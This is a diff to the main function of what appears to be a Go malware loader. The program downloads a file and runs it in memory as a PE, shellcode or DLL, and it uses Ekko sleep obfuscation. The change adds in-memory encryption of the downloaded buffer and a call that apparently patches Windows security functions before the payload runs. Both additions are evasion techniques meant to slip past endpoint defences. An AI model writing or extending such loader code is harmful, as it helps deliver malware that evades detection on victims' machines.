@@ -17,6 +17,7 @@ func main() {
 
 	ekko.EkkoSleep(100)
 
+
 	var (
 		uPE       = flag.Bool("pe", false, "Load and execute PE file")
 		uSh = flag.Bool("shellcode", false, "Execute shellcode")
@@ -26,7 +27,7 @@ func main() {
 	)
 	
 	flag.Parse()
-	
+
 	flagCount := 0
 	if *uPE { flagCount++ }
 	if *uSh { flagCount++ }
@@ -41,7 +42,7 @@ func main() {
 		fmt.Println("  -func:      Function name for DLL execution")
 		return
 	}
-	
+
 	if flagCount > 1 {
 		log.Fatalln("[ERROR] Only one execution type can be specified")
 	}
@@ -54,9 +55,30 @@ func main() {
 	if err != nil {
 		log.Fatalf("[ERROR] Failed to download file: %v\n", err)
 	}
-	
+
+	addr, size, err := net.GetGlobalBufferRegion()
+	if err != nil {
+		log.Fatalf("[ERROR] Failed to get global buffer region: %v\n", err)
+	}
+
+	key, err := ekko.GenerateKey(16)
+	if err != nil {
+		log.Fatalf("[ERROR] Failed to generate key: %v\n", err)
+	}
+
+	err = ekko.EncryptMemoryRegion(addr, size, key)
+	if err != nil {
+		log.Fatalf("[ERROR] Failed to encrypt memory region: %v\n", err)
+	}
+
+	// we just call it again to decrypt bc symmetric 
+	err = ekko.EncryptMemoryRegion(addr, size, key)
+	if err != nil {
+		log.Fatalf("[ERROR] Failed to encrypt memory region: %v\n", err)
+	}
+
+	winapi.ApplyCriticalPatches()
 	if *uPE {
-		ekko.EkkoSleep(100)
 		err := pe.LoadPEFromBytes(fileBytes)
 		if err != nil {
 			log.Fatalf("[ERROR] Failed to load PE: %v\n", err)
